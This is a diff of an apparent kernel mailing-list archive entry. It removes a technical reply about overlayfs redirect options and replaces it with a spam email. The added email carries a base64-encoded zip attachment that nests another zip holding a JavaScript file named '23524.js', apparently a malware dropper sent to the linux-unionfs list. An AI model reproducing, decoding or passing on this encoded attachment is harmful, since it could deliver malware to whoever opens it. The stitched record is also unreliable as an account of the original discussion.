@@ -1,85 +1,68 @@
-From: Miklos Szeredi <miklos@szeredi.hu>
-Subject: Re: [PATCH v2 05/11] ovl: lookup redirect by file handle
-Date: Fri, 28 Apr 2017 09:55:03 +0200
-Message-ID: <CAJfpegtXZyX6aubi_TPP_532pb_y+Vv987U08pYkE2SPE0hOuw@mail.gmail.com>
-References: <1493025256-27188-1-git-send-email-amir73il@gmail.com>
- <1493025256-27188-6-git-send-email-amir73il@gmail.com> <CAJfpegtz0emDRTHDrq0CrSZXAcovrLAAsX+-WkPGDRbyZD5vOw@mail.gmail.com>
- <CAOQ4uxhu4LVJ-MAjH6McK31MYZ8__RkjCoK31kqJ-7fA2gu+SA@mail.gmail.com>
- <CAOQ4uxiGwd-h2kJVLKkbyBC9YD_a=19ta1HB0F9KueqL_Pr3XA@mail.gmail.com>
- <CAJfpegssdQ4E=uY3bq8zgXLHZsOQaJXpMWtCZ+V=yVM8vmcw5w@mail.gmail.com>
- <CAOQ4uxgPpnnc5dC+PSuOOWdpnobdKZNzgBzmbeW4Lw6P8_--hg@mail.gmail.com>
- <CAJfpeguaePn++tZBvd-2Z68a_8WGfy7EuWLzODyv60E45C6WSQ@mail.gmail.com>
- <CAOQ4uxiozume+xj4KHiDTwqgWmmXKL+6Ksw1EDWXuZYDFa2KVQ@mail.gmail.com>
- <CAJfpegtv4kN4d7ti5f5p=51aQk8U2UT9xdsvZkYoXWOfQ5BNcQ@mail.gmail.com>
- <CAOQ4uxhi4GReBbBzd8NdCJ+emzMEa1COYAtcaKziMiaZAV96uw@mail.gmail.com>
- <CAOQ4uxiGzp2G3qSC7be3nVnvjYJZuHAmY7Q1Oc+jM+pZWtuHig@mail.gmail.com>
- <CAJfpegtAx_KXb6v0dBAD0AJvLeTCFF1X4rfdAptn0xPqRHiLBQ@mail.gmail.com>
- <CAJfpegt9-w_2wQ_Y94w8AcuHYtzJ1fW6n21=eQPbyYqsNawOpQ@mail.gmail.com>
- <CAOQ4uxiweaqzR3eT-StgtDFAHBuYhGRvAJE6v=XpH33MevpmoA@mail.gmail.com>
- <CAJfpegtTJmcLVrLOeQbhu4Q6sM0Mi_FRgr+vStF0k95QsWm5uQ@mail.gmail.com>
- <CAOQ4uxhQFis+uDL9KbiJ87hNU=QRsjHn6O4LShnt6JJFaOtNuA@mail.gmail.com>
- <CAJfpegv4kbUU1+t6+ZApQmnzbOEo-qiHOTy3Dj0Zh84zw9JeUw@mail.gmail.com>
- <CAOQ4uxjkwPwBF7F+Hrf0J_-s1fdCnBPC4wYd04fDtF8wSRaT_Q@mail.gmail.com> <CAOQ4uxjGFRXHNNXtyqm0DAdakbSj0yc+sJLcFMmB+VUkMhk0pQ@mail.gmail.com>
+From: <athgregory@gmail.com>
+Subject: 18635 linux-unionfs
+Date: Fri, 28 Apr 2017 07:59:27 -0000
+Message-ID: <149336636732.22262.17633288479707666791@vnpt.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
+Content-Type: application/zip; name="9.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-unionfs-owner@vger.kernel.org>
-Received: from mail-io0-f182.google.com ([209.85.223.182]:33067 "EHLO
-        mail-io0-f182.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1164115AbdD1HzF (ORCPT
-        <rfc822;linux-unionfs@vger.kernel.org>);
-        Fri, 28 Apr 2017 03:55:05 -0400
-Received: by mail-io0-f182.google.com with SMTP id k87so53750493ioi.0
-        for <linux-unionfs@vger.kernel.org>; Fri, 28 Apr 2017 00:55:05 -0700 (PDT)
-In-Reply-To: <CAOQ4uxjGFRXHNNXtyqm0DAdakbSj0yc+sJLcFMmB+VUkMhk0pQ@mail.gmail.com>
+Received: from static.vnpt.vn ([14.190.3.126]:35172 "HELO vnpt.vn"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1424611AbdD1H7e (ORCPT <rfc822;linux-unionfs@vger.kernel.org>);
+        Fri, 28 Apr 2017 03:59:34 -0400
+Content-Disposition: attachment
 Sender: linux-unionfs-owner@vger.kernel.org
 List-Id: linux-unionfs@vger.kernel.org
-To: Amir Goldstein <amir73il@gmail.com>
-Cc: "linux-unionfs@vger.kernel.org" <linux-unionfs@vger.kernel.org>, Vivek Goyal <vgoyal@redhat.com>
+To: linux-unionfs@vger.kernel.org
 
-On Fri, Apr 28, 2017 at 9:25 AM, Amir Goldstein <amir73il@gmail.com> wrote:
-> With all recent conclusions, do you see a reason to keep origin root fh?
-
-No, I'm quite happy if we don't :)
-
-> For snapshots I need just one thing -
-> Verify that origin.fh matches the lower of merge dir that was found by path.
-> The verification is very cheap (only encode the found dentry), so we may
-> do it in any configuration, just don't know how to act upon it.
->
-> What to do in case verification fails may need configuration option.
-> For snapshots I need a 'strict' policy meaning that "stale lower" equals
-> "implicit opaque", but that will not do the right thing for copied layers case.
->
-> The way I have it now in my snapshot patches is overload on the redirect_dir
-> mount option and add a value redirect_dir=fh. The build time and module
-> options are still boolean, but -o redirect_dir=fh sets config->redirect_dir=true
-> and config->redirect_fh=true.
-> config->redirect_fh can later be set to false if the prerequisite (samefs etc)
-> don't apply.
->
-> I may need to separate the general ofs->redirect_fh capabiltiy from the mount
-> configuration (i.e. config->redirect_dir_fh or make
-> config->redirect_dir an enum).
->
-> I could also add more policy options for redirect_dir, i.e.:
-> off - pre v4.10 compat
-> on - v4.10 compat (path only)
-> path - same as on, just to explicitly mention for when knowingly copying layers
-> fh - snapshot case, fh must be verified
-> auto - (the default?) best effort w.r.t lower dir renames -
-> lookup by path, verify fh, if fails try to lookup by fh, if fails use
-> path result anyway.
->
-> I realize you prefer the "minimum configuration" policy, but I'm afraid we
-> are at a cross road of letting the user decide. No?
-
-Is this only about dirs though?
-
-For now I'd just add a "verify_lower" option defaulting to off and not
-expand "redirect_dir".  That should take care of the snapshot case,
-right?
-
-The more complicated things can come later.
-
-Thanks,
-Miklos
+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
